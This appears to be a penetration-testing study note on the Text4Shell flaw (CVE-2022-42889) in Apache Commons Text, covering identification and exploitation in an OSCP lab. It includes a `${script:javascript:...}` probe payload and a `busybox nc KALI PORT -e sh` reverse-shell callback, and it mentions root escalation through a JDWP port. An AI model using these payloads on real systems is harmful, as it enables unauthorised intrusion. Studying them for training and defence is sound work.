---
title: "Text4Shell"
slug: text4shell
category: notes
handbook: oscp
tags: ["web", "exploit-development"]
draft: false
pubDatetime: 2026-09-08T22:24:21+03:00
modDatetime: 2026-09-08T22:35:52+03:00
description: "Apache Commons Text 1.5 through 1.9 (CVE-2022-42889, fixed in 1.10) expands `${prefix:name...}` lookups in any string passed through its default StringSubstitutor, and the `script` lookup hands the expression to the JVM's JavaScript engine, so `${script:javascript:...}` runs arbitrary Java."
---
Apache Commons Text 1.5 through 1.9 (CVE-2022-42889, fixed in 1.10) expands `${prefix:name...}` lookups in any string passed through its default StringSubstitutor, and the `script` lookup hands the expression to the JVM's JavaScript engine, so `${script:javascript:...}` runs arbitrary Java. No template engine needs to be in the app; any code path that interpolates user input is enough. Unlike Log4Shell nothing triggers passively here: the application calls the interpolation itself, so a reflective endpoint is the usual entry.

## Identification

- Anything naming the dependency and its version: CHANGELOG pages, build-info endpoints, leftover `pom.xml` files. On OSCP B the whole bug was announced by `/CHANGELOG`: "Added Apache Commons Text 1.8 Dependency for String Interpolation".
- Endpoints that echo input back. The expansion result usually returns to the client, so a reflective field is both probe and delivery: `${script:javascript:7*7}` coming back as `49` confirms evaluation.

JDK 15 and up dropped the bundled Nashorn engine, so `script` lookups fail there unless a standalone engine sits on the classpath.

## Exploitation

The `script:javascript:` payload calling `Runtime.exec` and the curl delivery that beats Tomcat's 400 are in [Server-Side Template Injection](/collections/oscp/server-side-template-injection#command-execution-on-a-java-engine) and [Server-Side Template Injection](/collections/oscp/server-side-template-injection#delivery-let-curl-encode-it).

`Runtime.exec` is not a shell, so pipes and redirects in the command string reach the spawned process as arguments. The callback needs to be a single executable, which is the `busybox nc KALI PORT -e sh` shape from [Reverse Shells](/collections/oscp/reverse-shells). The callback lands as the account running the JVM; on the OSCP B box that was `dev` on the api.jar process, with the escalation from there (a root java process exposing its JDWP debug port) recorded in the lab note.

Related: [Server-Side Template Injection](/collections/oscp/server-side-template-injection), [Command Injection](/collections/oscp/command-injection), [Reverse Shells](/collections/oscp/reverse-shells).
